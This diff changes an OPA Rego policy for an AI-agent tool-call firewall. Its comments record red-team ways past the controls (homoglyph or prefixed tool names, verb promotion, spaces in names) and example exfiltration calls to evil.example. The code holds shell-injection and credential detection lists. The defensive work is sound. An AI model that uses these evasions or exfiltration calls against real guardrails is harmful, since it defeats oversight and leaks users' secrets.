@@ -187,8 +187,28 @@ sql_syntax_context(val, pattern) { startswith(trim_space(val), pattern) }
 sql_syntax_context(val, _) { contains(val, ";") }
 
 # Shell injection
+#
+# TWO lists, because raw text and DECODED BYTES are not the same evidence and must not share a
+# pattern set. A "|" in a parameter a human typed is weak-but-real evidence of a shell pipe. A "|"
+# among the ~9 bytes you get from base64-decoding an ordinary English phrase is no evidence at all —
+# it is one byte in 256 coming up 0x7C.
+#
+# This is measured, not theoretical. `shell_injection_detected`'s decoded arm used to reuse the RAW
+# list (then named `shell_patterns_decoded`, one transposition away from the correct
+# `decoded_shell_patterns` below and easily mistaken for it), and that single reuse produced the whole
+# base64 false-positive curve both red-team campaigns recorded: 4.0% at 8 chars, 32.0% at 64, 12.7%
+# overall, and 2.5% reproduced on plain English prose.
+#
+# Traced end to end: {"note": "benign call 18"} -> b64_candidate_clean strips the spaces ->
+# `benigncall18` clears the >=8 length gate, the charset gate and the not-all-digits gate -> decodes
+# to 6d e9 e2 82 77 1a 96 5d 7c -> the final byte 0x7C is "|" -> deny_shell_execution. The customer
+# wrote a sentence; the control reported a shell injection.
+#
+# So the decoded arm matches MULTI-BYTE indicators only — the same list the dedicated
+# `base64_decoded_threat` rule below already uses correctly, which is why THAT rule never had this
+# problem. A real encoded payload still matches: base64("rm -rf /") decodes to "rm -rf /". Bare
+# metacharacters stay on the raw arm, where they mean something.
 shell_patterns = ["|", ";", "$(", "`", "rm -rf", "/etc/passwd", "/etc/shadow"]
-shell_patterns_decoded = ["|", "$(", "`", "rm -rf", "/etc/passwd", "/etc/shadow", "nc -e", "wget ", "curl "]
 
 shell_injection_detected {
     val := security_scan_texts_raw[_]
@@ -197,7 +217,7 @@ shell_injection_detected {
 }
 shell_injection_detected {
     val := lower(security_scan_decoded_raw[_])
-    pattern := shell_patterns_decoded[_]
+    pattern := decoded_shell_patterns[_]
     contains(val, pattern)
 }
 
@@ -220,6 +240,140 @@ egress_verb_tool {
 }
 egress_verb_tool { contains(lower(input.tool_name), "webhook") }
 egress_verb_tool { contains(lower(input.tool_name), "exfil") }
+
+# THE ENGINE'S OWN CLASSIFICATION — see comprehensive.rego for the full argument.
+#
+# THIS FILE IS THE ONE THAT SHIPS. The bootstrap pushes this preset as the cluster `__baseline__`, so
+# fixing only comprehensive.rego left the running cluster exactly as exposed: with the fix in that
+# file and real `opa` reporting block, a live `/evaluate` still returned
+# `allow/default_allow` for a credential through `slack_post_message`. The two files are a documented
+# pair of guarded copies (this OPA cannot import across packages), and a defence added to one of them
+# is a defence that is not deployed.
+#
+# `input.derived.verb` is computed on the hot path for every call and published by
+# engine/evaluator.py. The prefix list above and the registry disagree on ordinary vendor tool names —
+# `slack_post_message` starts with `slack_`, not `post_` — so the exfiltration path was chosen by
+# whichever SaaS the customer happens to use. `object.get` with a default so an engine predating
+# `derived.verb` keeps the name-based behaviour rather than erroring.
+egress_verb_tool { object.get(input.derived, "verb", "") == "send"; not retrieval_lead_tool }
+
+# ...but read the classification, do not obey it — SAME TEXT AS comprehensive.rego, and the reason the
+# pair has to move together. The registry classifies a name by taking the WORST verb over ALL of its
+# tokens, so a tool that LEADS with a retrieval verb and merely carries an egress NOUN later is
+# published as verb="send": `get_mail`, `list_mail`, `read_email_thread`, `search_mail`,
+# `get_sync_status`, `download_export` are all reads, and `mail`/`email`/`sync`/`export` are all SEND
+# tokens. Taking the classification verbatim made every one of them a sink, and `sensitive_keys` holds
+# the bare key `token`, so an ordinary paginated read
+#
+#   get_mail{"folder": "INBOX", "token": "AQABAAAA-nextPage"}   -> ("block", "llm02_data_leakage")
+#
+# started being refused as data leakage BY THE ENFORCED CLUSTER BASELINE. Measured over 53 realistic
+# vendor tool names, 39 non-egress tools (28 reads, 11 writes) became sinks. A pagination cursor is not
+# a credential, and a refusal is not free — an enforcing baseline that denies the majority of benign
+# reads gets turned off. So the LEADING token, which is the tool's own statement of what it does and is
+# exactly the evidence the registry's `max()` discards, withholds the CLASSIFICATION-derived sink.
+#
+# Withheld narrowly, on purpose. This does NOT touch the prefix / *webhook* / *exfil* bodies above, so
+# `fetch_url`, `http_get` and `put_object` stay sinks by prefix despite leading with a retrieval verb.
+#
+# TOKENISED THE WAY THE REGISTRY TOKENISES IT — SAME TEXT AS comprehensive.rego. `_tokenize_tool`
+# splits a name on separators AND on camelCase boundaries, so `getMail`, `get-mail`,
+# `chat.postMessage` and `SES:SendRawEmail` are classified exactly like their snake_case spellings —
+# while `startswith(name, "get_")` and `split(name, "_")` only ever see snake_case. Reading a
+# camelCase-aware classification with a snake_case-only rule broke this section in BOTH directions,
+# measured through real opa on THIS file, the one the cluster enforces:
+#
+#   getMail{"folder": "INBOX", "token": "pg2"}       -> still ("block","llm02_data_leakage")   [over-block survives a change of spelling]
+#   sendEmail / postMessage / send-email + verb=read -> ("allow","default_allow")              [the demotion below still works]
+#
+# One `strings.replace_n` (26 letters + the four separators) costs no regex op — the file is at 24 of
+# the API's 25 — and is linear in the name: a 40 000-character name evaluates in 0.07s.
+name_split_map = {"A": "_a", "B": "_b", "C": "_c", "D": "_d", "E": "_e", "F": "_f", "G": "_g", "H": "_h", "I": "_i", "J": "_j", "K": "_k", "L": "_l", "M": "_m", "N": "_n", "O": "_o", "P": "_p", "Q": "_q", "R": "_r", "S": "_s", "T": "_t", "U": "_u", "V": "_v", "W": "_w", "X": "_x", "Y": "_y", "Z": "_z", "-": "_", ".": "_", ":": "_", "/": "_", " ": "_", "\t": "_", ",": "_", "+": "_", "|": "_", "\\": "_"}
+# Separators, NOT just punctuation-that-looks-like-a-separator. `delete records` with a SPACE
+# evaded the destructive-verb arm in round 2 of the campaign: the map split on -, ., :, / and
+# camelCase, so those variants were caught, but a space left `delete records` as ONE token which
+# matches no verb. Tool names are server-DECLARED strings — an MCP server chooses them — so
+# "nobody would name a tool with a space" is not a control, it is an assumption about an
+# attacker. Widening the split can only ADD tokens and therefore only ADD matches, so it cannot
+# open a new allow; the collateral risk is over-blocking, and a legitimate name like
+# `report_deleted_items` still tokenises to `deleted`, which is not `delete`.
+tool_name_tokens = [t | t := split(strings.replace_n(name_split_map, input.tool_name), "_")[_]; t != ""]
+
+# Destructive verbs, matched as whole TOKENS anywhere in the name by the `strict_default_block` arm
+# down in the CONTROLS region. Defined HERE rather than beside that arm because the baseline compiler
+# parses the CONTROLS region as rule heads only and refuses anything else outright
+# ("unparsable line in CONTROLS region") — which is the right way for it to fail, but it means a
+# helper definition has to live outside the markers.
+# The SAME tokens, over the confusable-folded name. `skeleton()` (published by the engine as
+# `input.tool_name_normalized`, evaluator.py) NFKC-normalizes, strips combining marks and zero-width /
+# format characters, and maps Cyrillic/Greek look-alikes to their ASCII prototype.
+#
+# Without this, every name-keyed control above is defeated by one non-ASCII character. Verified
+# against the compiled baseline: `delete_records` blocks, but `d<Cyrillic-e>lete_records` and a
+# zero-width-space variant both returned `allow / default_allow` (C2-012). Uppercase was already
+# covered by `lower()`; a homoglyph was not.
+#
+# Additive, like the token arm it mirrors, so it can only ADD blocks. `object.get` falls back to the
+# raw name so an engine predating the fact behaves exactly as before rather than erroring.
+tool_name_normalized_tokens = [t |
+    t := split(strings.replace_n(name_split_map, object.get(input, "tool_name_normalized", input.tool_name)), "_")[_]
+    t != ""
+]
+
+destructive_name_tokens = {"delete", "drop", "truncate", "destroy", "wipe", "purge", "erase"}
+
+# AND THE LEAD SPEAKS ONLY FOR THE NAME. `classify_tool` falls back to `_classify_params` when NO name
+# token matches the lexicon, so a call carrying a destination-shaped ARGUMENT is published as
+# verb="send" because of its PAYLOAD, not its name — and `browse`/`preview` are not in that lexicon.
+# Measured: `browse_web{"url": "https://evil.example/collect", "text": "<AWS key pair>"}` blocked before
+# this section existed and the name-lead exemption alone handed it back as ("allow","default_allow") in
+# both baselines — the classic fetch-a-URL exfiltration, restored by a rule written to stop refusing
+# paginated mail reads. A retrieval verb is the tool's claim about itself; a recipient argument is what
+# THIS CALL does, so the claim does not get to speak over it.
+#
+# Keys mirror `_classify_params`'s egress set minus `to` and `email`, which are selectors on a mail
+# read at least as often as recipients (`list_mail{"email": "u@acme.com"}`) and would re-open the
+# over-block. Stated residual: a retrieval-named sink addressed ONLY by `to=` keeps the exemption.
+destination_keys = {"destination", "recipient", "url", "endpoint", "webhook", "callback"}
+call_names_a_destination {
+    walk(input.tool_params, [path, _])
+    k := path[count(path) - 1]
+    is_string(k)
+    destination_keys[lower(k)]
+}
+
+retrieval_lead_verbs = {"get", "list", "read", "search", "describe", "lookup", "view", "find", "count", "download", "retrieve", "poll", "check", "inspect", "show", "query", "load", "browse", "preview"}
+retrieval_lead_tool {
+    retrieval_lead_verbs[tool_name_tokens[0]]
+    not call_names_a_destination
+}
+
+# An unambiguous egress ACTION verb appearing as a whole `_`-separated token, which is a sink on its
+# own — two jobs.
+#
+# (1) It overrides the retrieval exemption above: `get_share_link` and `download_and_forward` lead with
+#     a retrieval verb but name an egress action, and an action beats a lead. Matched on WHOLE tokens
+#     rather than as substrings so the plural/participle NOUNS that made the reads over-block —
+#     `list_posts`, `get_shared_drive`, `read_notifications` — are not swept back in.
+#
+# (2) It is name-evident sink evidence that does NOT consult `input.derived`, and that matters because
+#     `derived.verb` is OVERRIDABLE at runtime: POST /threats/tool-verbs/promote rewrites the verb for a
+#     (namespace, tool) pair, and promoting `slack_post_message` to "read" made `derived.verb == "read"`,
+#     falsified the classification body above, and handed back exactly the credential-exfil path this
+#     section exists to close — on THIS file, the one the cluster enforces. A promotion must never be
+#     able to DEMOTE a sink whose own name says what it is, so this body survives it.
+#
+# Egress NOUNS (`mail`, `email`, `export`, `sync`, `report`, `ticket`) are deliberately absent — they are
+# what made the reads above over-block. Stated residual: a genuine noun/verb collision (`get_post` on a
+# blog API, `read_share`) is treated as a sink, and a sink deliberately named `get_*` carrying no action
+# token is missed. Both are name-shaped judgements; the payload rules below still apply to either.
+#
+# Over `tool_name_tokens`, so a promotion cannot be dodged by spelling the sink `sendEmail` instead of
+# `send_email` — `split(name, "_")` saw ONE token there and the whole demotion defence was snake-only.
+egress_action_tokens = {"send", "post", "upload", "publish", "forward", "relay", "dispatch", "share",
+                        "transmit", "deliver", "broadcast", "notify", "emit", "push", "webhook",
+                        "exfil", "exfiltrate", "leak", "smtp", "sms", "egress", "outbound"}
+egress_verb_tool { egress_action_tokens[tool_name_tokens[_]] }
 
 data_leakage_detected {
     external_tools[input.tool_name]
@@ -250,11 +404,50 @@ secret_value_patterns = [
     `-----begin [a-z ]*private key-----`,
 ]
 
+# DL-001b: a BARE, UNLABELLED credential in a param value.
+#
+# Every pattern above needs a LABEL — `api_key:`, `secret_key=`, `bearer <tok>`. A raw key pasted
+# into a message body carries no label and matched nothing. Recorded live in
+# DESIGN-NOTE-MCP-FIREWALL.md §11.5: under this very preset, `send_email` to an attacker-controlled
+# address with `AKIAIOSFODNN7EXAMPLE wJalr...` in the body was ALLOWED, while a card number in the
+# same position blocked. These shapes are self-identifying and need no label.
+#
+# They extend the single credential pattern list rather than getting their own rule ON PURPOSE: one
+# match call over a list costs ONE regex op regardless of list length, and the API caps a stored
+# policy at 25 ops (tests/api/test_shipped_presets_validate.py). Note the cap is counted TEXTUALLY,
+# so even naming the builtin in a comment spends budget — a separate rule, or this sentence written
+# less carefully, would have consumed the last of the headroom for no added expressiveness.
+all_credential_patterns := array.concat(secret_value_patterns, bare_credential_patterns)
+
+bare_credential_patterns = [
+    `\b(AKIA|ASIA|AGPA|AIDA|AROA|AIPA|ANPA|ANVA)[0-9A-Z]{16}\b`,
+    `\bgh[pousr]_[A-Za-z0-9]{16,}\b`,
+    `\bxox[baprs]-[A-Za-z0-9-]{10,}\b`,
+    `\bAIza[0-9A-Za-z_-]{35}\b`,
+    `\b(sk|rk)_(live|test)_[0-9A-Za-z]{16,}\b`,
+    `\beyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\b`,
+    `\bglpat-[A-Za-z0-9_-]{16,}\b`,
+]
+
+# Texts the credential rules scan. `security_scan_texts` lowercases, which is right for prose
+# (injection phrases) and wrong for credential shapes: an AWS key id is uppercase by construction,
+# and folding case turns `AKIA[0-9A-Z]{16}` into a pattern loose enough to hit ordinary words. So the
+# credential rules see BOTH the folded copy (for the labelled patterns) and the original.
+secret_scan_texts[t] {
+    t := security_scan_texts[_]
+}
+
+secret_scan_texts[t] {
+    walk(input.tool_params, [_, val])
+    is_string(val)
+    t := val
+}
+
 data_leakage_detected {
     external_tools[input.tool_name]
-    val := security_scan_texts[_]
+    val := secret_scan_texts[_]
     some i
-    regex.match(secret_value_patterns[i], val)
+    regex.match(all_credential_patterns[i], val)
 }
 # BULK REGULATED-DATA EXPORT to an external sink.
 #
@@ -302,10 +495,11 @@ data_leakage_detected {
 # external_tools — mirrors the egress-verb key-name rule above and comprehensive.rego.
 data_leakage_detected {
     egress_verb_tool
-    val := security_scan_texts[_]
+    val := secret_scan_texts[_]
     some i
-    regex.match(secret_value_patterns[i], val)
+    regex.match(all_credential_patterns[i], val)
 }
+
 
 # Reading an environment secret / credential is data egress (OWASP LLM02).
 secret_read_tools = {"read_env", "getenv", "get_secret", "read_secret", "fetch_secret"}
@@ -565,6 +759,20 @@ scope_violation_dangerous_tool {
 }
 
 # --- partial-set triggers (rule_id -> guard) ---
+#
+# >>> CONTROLS-BEGIN
+# Everything between these markers is the CONTROL REGISTRATION section, and it is the only part of
+# this file the baseline compiler (norviq/api/baseline.py) rewrites. Each line binds one control id to
+# one guard; the detector predicates above are a shared library and are never touched.
+#
+# A control's effect is purely which set its head registers into:
+#   deny    -> blocks[...]  (or escalates[...], preserving the head's original severity)
+#   monitor -> audits[...]  — evaluated, recorded as non-compliant, call proceeds
+#   off     -> omitted entirely
+#
+# So changing what a control DOES never changes how it DETECTS. Keep every head on a single line in
+# the form `set["control_id"] { guard }` — the compiler parses this region line by line, and a head
+# split across lines is silently dropped, which would turn a control off without saying so.
 blocks["llm01_prompt_injection"] { injection_detected }
 blocks["deny_sql_injection"] { sql_injection_detected }
 blocks["deny_shell_execution"] { shell_injection_detected }
@@ -591,10 +799,40 @@ blocks["strict_default_block"] { startswith(lower(input.tool_name), "destroy_") 
 blocks["strict_default_block"] { startswith(lower(input.tool_name), "wipe_") }
 blocks["strict_default_block"] { startswith(lower(input.tool_name), "purge_") }
 blocks["strict_default_block"] { startswith(lower(input.tool_name), "erase_") }
+# ...and the same verb ANYWHERE in the name, not only at the front. Every arm above is `startswith`
+# on a caller-supplied string, so the control was opt-out-able by rename: measured live on AKS,
+# `delete_all_records` was caught on 75/75 calls and `get_delete_all_records` was allowed on 75/75.
+# One prefix turned a control that fires on every call into one that fires on none. Same root cause
+# as the homoglyph tool name (C2-012) and the destination-keyed control (C2-013): a name the attacker
+# writes was the whole input.
+#
+# NOT keyed on `derived.verb`, and that is the point worth keeping. Keying the BLOCK on the classifier
+# looks obvious and is wrong: `classify_tool` takes the WORST verb over all name tokens, so it
+# over-classifies — `classify_tool("run_query")` and `classify_tool("execute_sql")` both return
+# `delete`. An arm blocking `verb == "delete"` therefore refuses ordinary read tools, which
+# tests/engine/test_capability.py::test_reads_are_not_swept_up_by_the_wider_lexicon caught immediately.
+# Over-classification is safe where it NARROWS (the rate-limit exemption asks for `read`, so a
+# mislabelled read is merely throttled) and unsafe where it BLOCKS. Different direction, different
+# rule.
+#
+# So: whole TOKENS over `tool_name_tokens`, the same primitive and the same reasoning the egress
+# section above uses — which also means `getDeleteAllRecords` cannot dodge it by dropping the
+# underscores, since `name_split_map` splits camelCase first. Whole tokens rather than substrings so
+# `undelete_`, `delete_candidates_report` style NOUNS are the only residual, and this control's
+# shipped caveat already documents that it matches on the name with no regard to arguments.
+blocks["strict_default_block"] { destructive_name_tokens[lower(tool_name_tokens[_])] }
+blocks["strict_default_block"] { destructive_name_tokens[lower(tool_name_normalized_tokens[_])] }
 
 escalates["llm06_excessive_agency"] { elevated_tools[input.tool_name] }
 
 audits["scope_violation_dangerous_tool"] { scope_violation_dangerous_tool }
+
+# Moved here from beside its predicate (~line 800) so every registration head lives in one region.
+# The predicate `_sql_metachar_only_block` stays where it is with the rest of the SQL detectors; only
+# the binding moved. A head outside these markers would be invisible to the compiler, so its control
+# could never be toggled and would silently keep enforcing at whatever severity it was written with.
+blocks["deny_sql_multi_statement"] { _sql_metachar_only_block }
+# >>> CONTROLS-END
 
 # reason text per rule_id. default_allow + the engine fallback are included for completeness.
 reasons = {
@@ -655,8 +893,6 @@ _sql_metachar_only_block {
     shell_injection_detected
     not _genuine_shell_marker_present
 }
-blocks["deny_sql_multi_statement"] { _sql_metachar_only_block }
-
 _shell_shadowed_by_sql(id) { id == "deny_shell_execution"; sql_injection_detected }
 _shell_shadowed_by_sql(id) { id == "deny_shell_execution"; _sql_metachar_only_block }
 rule_id = sort([id | blocks[id]; not _shell_shadowed_by_sql(id)])[0] { block_fired }
